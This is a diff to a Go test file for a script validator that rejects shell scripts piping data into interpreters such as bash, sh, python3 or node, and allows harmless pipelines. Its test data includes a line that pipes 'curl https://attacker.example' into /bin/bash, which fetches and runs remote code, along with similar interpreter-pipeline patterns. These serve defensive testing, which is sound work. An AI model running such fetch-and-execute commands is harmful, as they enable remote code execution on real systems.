@@ -277,6 +277,8 @@ func TestValidateScriptAssetRejectsInterpreterPipelines(t *testing.T) {
 		"#!/bin/bash\n/usr/bin/curl https://attacker.example | /bin/bash\n",
 		"#!/bin/bash\n/usr/bin/printf payload | command /usr/bin/env SAFE=1 python3\n",
 		"#!/bin/bash\n/usr/bin/printf payload | { /usr/bin/node; }\n",
+		"#!/bin/bash\n/usr/bin/printf payload | exec -a hook-shell /bin/bash\n",
+		"#!/bin/bash\n/usr/bin/printf payload |& /bin/sh\n",
 	} {
 		if err := validateScriptAsset([]byte(script)); err == nil ||
 			!strings.Contains(err.Error(), "interpreter pipeline") {
@@ -286,9 +288,14 @@ func TestValidateScriptAssetRejectsInterpreterPipelines(t *testing.T) {
 }
 
 func TestValidateScriptAssetAllowsNonInterpreterPipeline(t *testing.T) {
-	const script = "#!/bin/bash\n/usr/bin/printf data | /usr/bin/grep data\n"
-	if err := validateScriptAsset([]byte(script)); err != nil {
-		t.Fatalf("validateScriptAsset() error = %v, want non-interpreter pipeline allowance", err)
+	for _, script := range []string{
+		"#!/bin/bash\n/usr/bin/printf data | /usr/bin/grep data\n",
+		"#!/bin/bash\n/usr/bin/printf data | command -v bash\n",
+		"#!/bin/bash\n/usr/bin/printf data | /usr/bin/python-build-tool\n",
+	} {
+		if err := validateScriptAsset([]byte(script)); err != nil {
+			t.Fatalf("validateScriptAsset(%q) error = %v, want non-interpreter pipeline allowance", script, err)
+		}
 	}
 }
 
